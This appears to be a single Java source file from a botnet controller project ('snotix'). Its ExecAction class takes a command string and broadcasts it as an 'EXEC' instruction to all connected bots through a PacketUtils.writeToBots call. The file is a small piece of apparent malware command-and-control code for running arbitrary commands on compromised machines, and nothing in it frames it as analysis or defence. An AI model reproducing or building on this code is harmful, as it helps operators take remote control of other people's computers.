package it.snotix.actions;

import it.snotix.network.PacketUtils;

public class ExecAction {
    public static void sendALL(String exec) {
        exec = exec.replace("EXEC", " ").trim();

        PacketUtils.writeToBots("EXEC " + exec);
    }
}
